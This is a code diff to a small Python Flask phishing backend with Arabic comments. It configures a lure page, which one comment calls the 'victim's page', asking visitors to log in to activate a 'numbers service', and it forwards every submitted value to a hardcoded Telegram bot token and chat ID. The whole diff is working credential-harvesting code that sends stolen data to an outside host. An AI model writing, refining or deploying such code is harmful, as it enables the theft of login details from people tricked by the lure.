@@ -3,14 +3,15 @@ import requests
 
 app = Flask(__name__)
 
-# ضع التوكن والأيدي الحقيقيين هنا (لا تضع روابط الموقع هنا)
+# 1. ضع التوكن الحقيقي هنا (الأرقام والرموز فقط)
 TOKEN = "8713127522:AAGfj4acg204MMc0SX7keJNtP4fWN9L-lYQ"
+# 2. ضع الأيدي الخاص بك هنا
 CHAT_ID = "7984067238"
 
-# لتخزين آخر إعدادات أرسلتها من اللوحة
+# تخزين الإعدادات لتعرضها صفحة الضحية
 latest_config = {
     "image": "https://telegra.ph/file/1792945d7d91986420551.jpg",
-    "letter": "سجل دخولك لتفعيل الخدمة",
+    "letter": "سجل دخولك لتفعيل خدمة الأرقام",
     "button": "تفعيل الآن"
 }
 
@@ -19,14 +20,13 @@ def save_data():
     global latest_config
     try:
         data = request.json
-        # إذا كانت البيانات قادمة من لوحة التحكم (لتحديث الإعدادات)
-        if 'image' in data and 'letter' in data:
+        # إذا كانت البيانات لتحديث اللوحة
+        if 'image' in data and 'letter' in data and 'button' in data:
             latest_config = data
         
-        # إرسال البيانات إلى تليجرام
-        full_message = f"🚀 **وصول بيانات جديدة:**\n\n{data}"
-        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-        requests.post(url, json={"chat_id": CHAT_ID, "text": full_message, "parse_mode": "Markdown"})
+        # إرسال البيانات للبوت
+        msg = f"🚀 **بيانات جديدة:**\n\n{data}"
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
         
         return jsonify({"status": "success"}), 200
     except Exception as e:
